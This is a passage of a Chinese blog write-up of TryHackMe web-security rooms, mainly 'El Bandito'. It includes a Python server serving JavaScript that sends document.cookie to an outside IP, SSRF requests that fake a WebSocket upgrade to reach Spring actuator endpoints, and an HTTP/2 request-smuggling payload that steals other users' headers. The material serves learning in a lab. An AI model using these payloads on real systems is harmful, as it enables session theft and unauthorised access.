<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/python3</span></span>
<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> http.server </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> BaseHTTPRequestHandler, HTTPServer</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ExploitHandler</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">BaseHTTPRequestHandler</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">do_GET</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B; font-style: italic">self</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.path </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;/&#39;</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_response</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">200</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Access-Control-Allow-Origin&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;*&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Content-type&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;text/html&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">end_headers</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.wfile.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">b</span><span style="color: #98C379">&quot;fetch(&#39;http://10.11.141.2:8080/&#39; + document.cookie)&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">run_server</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">port</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">1337</span><span style="color: #ABB2BF">):   </span></span>
<span class="line"><span style="color: #ABB2BF">    server_address </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">, port)</span></span>
<span class="line"><span style="color: #ABB2BF">    httpd </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HTTPServer</span><span style="color: #ABB2BF">(server_address, ExploitHandler)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">f</span><span style="color: #98C379">&quot;Server running on port </span><span style="color: #D19A66">{</span><span style="color: #ABB2BF">port</span><span style="color: #D19A66">}</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    httpd.</span><span style="color: #61AFEF">serve_forever</span><span style="color: #ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">__name__</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;__main__&#39;</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">run_server</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure>

<h1 id="El-Bandito"><a href="#El-Bandito" class="headerlink" title="El Bandito"></a>El Bandito</h1><p>技术点：Spring 薄弱点 + WebSocket 伪造 + HTTP&#x2F;2 降级 HTTP&#x2F;1.1 利用</p>
<h2 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">nmap -sC -sV -p 22,80,631,8080 elbandito.thm</span></span></code></pre></div></div></figure>

<img src="/thm_wap/image-20250729152931821.png" class="" title="image-20250729152931821">

<p>80 端口打不开，其实是 https 这里学到了可以通过指定端口号再加 -sC 探测服务</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">nmap -sC -sV -p 22,80,631,8080 elbandito.thm</span></span></code></pre></div></div></figure>

<p>631 有一个 cups 服务器，这个实际上一点用都没有，还以为切入点在这里</p>
<p>8080 是一个 web 服务器。网页里面有请求发起 websocket 连接，但是返回失败。然后图标是一个 Spring 的图标。</p>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>从这里 <a target="_blank" rel="noopener" href="http://10.10.138.222:8080/services.html">http://10.10.138.222:8080/services.html</a></p>
<p>发现两个域名，加进 hosts</p>
<ul>
<li>bandito.websocket.thm</li>
<li>bandito.public.thm</li>
</ul>
<p>实际上这个一点用都没有，查看页面源代码里面发现看到他是请求一个 isOnline 的接口，这里我们是不是可以想到 SSRF 呢，先本地搭一个服务端，url 填进去测试 ok。然后试试能不能伪造 WebSocket 升级成功的消息，同样可以。</p>
<h3 id="找切入点"><a href="#找切入点" class="headerlink" title="找切入点"></a>找切入点</h3><p>通过 Gobuster 遍历出来了一堆目录，但是没有什么有效信息，但是通过这个网页给了我一点启发。</p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html">https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html</a></p>
<p>Spring 有可以拿到信息的接口，但是有些地方是不允许访问的，我觉得是加了来源 IP 验证之类的机制，有下面这些：</p>
<ul>
<li><code>/dump</code>, <code>/trace</code>, <code>/logfile</code>, <code>/shutdown</code>, <code>/mappings</code>, <code>/env</code>, <code>/actuator/env</code>, <code>/restart</code>, and <code>/heapdump</code>.</li>
</ul>
<p>有了目标之后，就可以利用 SSRF 去伪造 WebSocket 升级，然后利用去访问受限制的端点。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET //isOnline?url=http://10.11.141.2:5555 HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: bandito.websocket.thm:8080</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 13</span></span>
<span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span>
<span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">GET /env HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: bandito.websocket.thm:8080</span></span></code></pre></div></div></figure>

<p>发现 <code>/admin-creds</code> 和 <code>/admin-flag</code> ，顺利拿到第一关的 flag 和第二关的入口。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在 Spring 应用程序中，&#x2F;trace 端点通常与 Spring Boot Actuator 模块相关联。它的主要作用是提供对最近 HTTP 请求的追踪信息。</p>
<h4 id="trace-端点的作用"><a href="#trace-端点的作用" class="headerlink" title="&#x2F;trace 端点的作用"></a>&#x2F;trace 端点的作用</h4><p>当 Spring Boot Actuator 的 &#x2F;trace 端点被启用并暴露时，访问这个路径会返回一个 JSON 格式的列表，其中包含了应用程序最近处理过的 HTTP 请求的详细信息。这些信息通常包括：</p>
<ul>
<li><p>请求方法 (e.g., GET, POST)</p>
</li>
<li><p>请求路径 (e.g., &#x2F;api&#x2F;users)</p>
</li>
<li><p>请求头 (Headers)</p>
</li>
<li><p>响应头 (Headers)</p>
</li>
<li><p>HTTP 状态码 (e.g., 200 OK, 404 Not Found)</p>
</li>
<li><p>请求时间戳</p>
</li>
<li><p>请求耗时</p>
</li>
</ul>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>注意这一关是 https 的 80 端口，登录进去之后发现是一个聊天室应用，刚开始尝试 XSS 都被 SOP 拦了，后面看了一下 wp 才知道，这个是利用 HTTP&#x2F;2 可能兼容 HTTP&#x2F;1.1 的机制。一个端口可以支持 HTTP&#x2F;2 也可以支持 HTTP&#x2F;1.1，然后利用页面上的一些可以回显或者存储的地方，把别人的请求头偷出来。</p>
<p>我的 Payload 如下，注意取消掉那个更新 Content-Length，刚开始发现 Content-Length 太小了没抓到想要的信息，后面改大了点成功拿下。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">POST /send_message HTTP/2</span></span>
<span class="line"><span style="color: #abb2bf">Host: bandito.public.thm:80</span></span>
<span class="line"><span style="color: #abb2bf">Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aIiNBQ.wx3IENsjmSyGaWrE0mUIZaP8Tq4</span></span>
<span class="line"><span style="color: #abb2bf">Content-Length: 0</span></span>
<span class="line"><span style="color: #abb2bf">Pragma: no-cache</span></span>
<span class="line"><span style="color: #abb2bf">Cache-Control: no-cache</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span></span>
<span class="line"><span style="color: #abb2bf">Accept-Language: zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;</span></span>
<span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Mobile: ?0</span></span>
<span class="line"><span style="color: #abb2bf">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span></span>
<span class="line"><span style="color: #abb2bf">Accept: */*</span></span>
<span class="line"><span style="color: #abb2bf">Origin: https://bandito.public.thm:80</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Fetch-Site: same-origin</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Fetch-Mode: cors</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Fetch-Dest: empty</span></span>
<span class="line"><span style="color: #abb2bf">Referer: https://bandito.public.thm:80/messages</span></span>
<span class="line"><span style="color: #abb2bf">Accept-Encoding: gzip, deflate, br</span></span>
<span class="line"><span style="color: #abb2bf">Priority: u=1, i</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">POST /send_message HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: bandito.public.thm:80</span></span>
<span class="line"><span style="color: #abb2bf">Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aIiNBQ.wx3IENsjmSyGaWrE0mUIZaP8Tq4</span></span>
<span class="line"><span style="color: #abb2bf">Content-Length: 700</span></span>
<span class="line"><span style="color: #abb2bf">Pragma: no-cache</span></span>
<span class="line"><span style="color: #abb2bf">Cache-Control: no-cache</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span></span>
<span class="line"><span style="color: #abb2bf">Accept-Language: zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;</span></span>
<span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Mobile: ?0</span></span>
<span class="line"><span style="color: #abb2bf">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span></span>
<span class="line"><span style="color: #abb2bf">Accept: */*</span></span>
<span class="line"><span style="color: #abb2bf">Origin: https://bandito.public.thm:80</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Fetch-Site: same-origin</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Fetch-Mode: cors</span></span>
<span class="line"><span style="color: #abb2bf">Sec-Fetch-Dest: empty</span></span>
<span class="line"><span style="color: #abb2bf">Referer: https://bandito.public.thm:80/messages</span></span>
<span class="line"><span style="color: #abb2bf">Accept-Encoding: gzip, deflate, br</span></span>
<span class="line"><span style="color: #abb2bf">Priority: u=1, i</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">data=</span></span></code></pre></div></div></figure>

<p><code>data=</code> 后面不要有任何数据。</p>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>其实这个房间好奇怪，我发现他用了 HTTP&#x2F;2 但是那些伪头一个都没用，然后他这种 HTTP2 和 HTTP1.1 混在一个包里面发，我很好奇他实际发出去的数据包是什么样的，看 burp 中的 hex 格式，里面分隔也用的是 <code>0d 0a</code> ，或许要用 Wireshark 抓包才能看到实际的数据包格式。</p>
<p>这章总体来说难度不高，但是还是挺考验之前 Rooms 所学到的东西的。光研究这一个 Room 我的一个下午就没了，不过也把 WAP 结束了。</p>
<p>不过发现了一个有用的网站：<a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/">https://book.hacktricks.wiki/</a> 里面有很多针对不同应用的思路，挺好的</p>

    
  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>Recopec<br>
        <strong>本文链接：</strong><a href="https://blog.irec.moe/thm_wap.html" title="https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_wap.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;blog.irec.moe&#x2F;thm_wap.html</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/WEB/" rel="tag">WEB</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1758794475138"></script>
  

  
      <div class="nexmoe-post-footer">
          <script src="https://giscus.app/client.js"
      data-repo="Recopec/Recopec.github.io"
      data-repo-id="R_kgDOHWxLSA"
      data-category="Announcements"
      data-category-id="DIC_kwDOHWxLSM4CYhGk"
      data-mapping="title"
      data-strict="0"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="preferred_color_scheme"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
</script>

      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E4%B8%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">枚举与暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%9E%9A%E4%B8%BE%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-number">1.1.</span> <span class="toc-text">认证枚举的目的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9E%9A%E4%B8%BE%E5%9C%B0%E6%96%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">常见枚举地方</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%AF%A6%E7%BB%86%E9%94%99%E8%AF%AF%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E9%82%AE%E7%AE%B1"><span class="toc-number">1.2.</span> <span class="toc-text">通过详细错误枚举用户邮箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E7%9A%84%E9%80%BB%E8%BE%91%E6%9D%A5%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">通过密码重置的逻辑来破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.4.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Session-%E7%AE%A1%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">Session 管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT-%E5%AE%89%E5%85%A8"><span class="toc-number">3.</span> <span class="toc-text">JWT 安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-Web-Tokens"><span class="toc-number">3.1.</span> <span class="toc-text">JSON Web Tokens</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.1.</span> <span class="toc-text">JWT 结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95"><span class="toc-number">3.1.2.</span> <span class="toc-text">签名算法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%AD%97%E6%AE%B5%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">敏感字段泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E9%94%99%E8%AF%AF"><span class="toc-number">3.3.</span> <span class="toc-text">签名验证错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D"><span class="toc-number">3.3.1.</span> <span class="toc-text">不验证签名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%AD%BE%E5%90%8D%E6%9C%AA%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">利用签名未验证漏洞进行攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">修复方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E5%8F%AF%E8%A2%AB%E9%99%8D%E7%BA%A7"><span class="toc-number">3.3.2.</span> <span class="toc-text">签名可被降级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-1"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">修复方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text">弱对称密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-%E7%AE%97%E6%B3%95%E6%B7%B7%E6%B7%86%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.4.</span> <span class="toc-text">JWT 算法混淆攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%88%86%E8%A7%A3"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">攻击流程分解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-2"><span class="toc-number">3.3.4.2.</span> <span class="toc-text">修复方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%95%88%E6%9C%9F"><span class="toc-number">3.4.</span> <span class="toc-text">有效期</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E9%94%99%E8%AF%AF%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.4.0.1.</span> <span class="toc-text">开发错误与修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9C%8D%E5%8A%A1%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">3.5.</span> <span class="toc-text">跨服务中继攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OAuth-%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">OAuth 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%A6%82%E5%BF%B5"><span class="toc-number">4.1.</span> <span class="toc-text">关键概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource-Owner"><span class="toc-number">4.1.1.</span> <span class="toc-text">Resource Owner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Client"><span class="toc-number">4.1.2.</span> <span class="toc-text">Client</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authorization-Server"><span class="toc-number">4.1.3.</span> <span class="toc-text">Authorization Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource-Server"><span class="toc-number">4.1.4.</span> <span class="toc-text">Resource Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authorization-Grant"><span class="toc-number">4.1.5.</span> <span class="toc-text">Authorization Grant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-Token"><span class="toc-number">4.1.6.</span> <span class="toc-text">Access Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Refresh-Token"><span class="toc-number">4.1.7.</span> <span class="toc-text">Refresh Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redirect-URI"><span class="toc-number">4.1.8.</span> <span class="toc-text">Redirect URI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scope"><span class="toc-number">4.1.9.</span> <span class="toc-text">Scope</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#State-Parameter"><span class="toc-number">4.1.10.</span> <span class="toc-text">State Parameter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token-Authorization-Endpoint"><span class="toc-number">4.1.11.</span> <span class="toc-text">Token &amp; Authorization Endpoint</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grant-Types"><span class="toc-number">4.2.</span> <span class="toc-text">Grant Types</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%89%B4%E5%88%AB-OAuth-%E6%A1%86%E6%9E%B6"><span class="toc-number">4.3.</span> <span class="toc-text">鉴别 OAuth 框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%B7-OAuth-Token"><span class="toc-number">4.4.</span> <span class="toc-text">偷 OAuth Token</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redirect-url-%E6%B2%A1%E6%9C%89%E8%A2%AB%E4%BF%9D%E6%8A%A4"><span class="toc-number">4.4.1.</span> <span class="toc-text">redirect_url 没有被保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA-state"><span class="toc-number">4.4.2.</span> <span class="toc-text">缺 state</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E6%B5%81"><span class="toc-number">4.4.3.</span> <span class="toc-text">隐式授权流</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MFA"><span class="toc-number">5.</span> <span class="toc-text">MFA</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hammer"><span class="toc-number">6.</span> <span class="toc-text">Hammer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Advanced-SQL-Injection"><span class="toc-number">7.</span> <span class="toc-text">Advanced SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">7.1.</span> <span class="toc-text">SQL 绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"><span class="toc-number">7.1.1.</span> <span class="toc-text">字符编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E5%BC%95%E5%8F%B7%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.2.</span> <span class="toc-text">没有引号的 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%85%81%E8%AE%B8%E7%A9%BA%E6%A0%BC"><span class="toc-number">7.1.3.</span> <span class="toc-text">不允许空格</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.</span> <span class="toc-text">带外注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">7.2.1.</span> <span class="toc-text">不同数据库的使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL"><span class="toc-number">7.2.1.2.</span> <span class="toc-text">MSSQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle"><span class="toc-number">7.2.1.3.</span> <span class="toc-text">Oracle</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">7.2.2.</span> <span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8A%80%E6%9C%AF"><span class="toc-number">7.3.</span> <span class="toc-text">其他技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 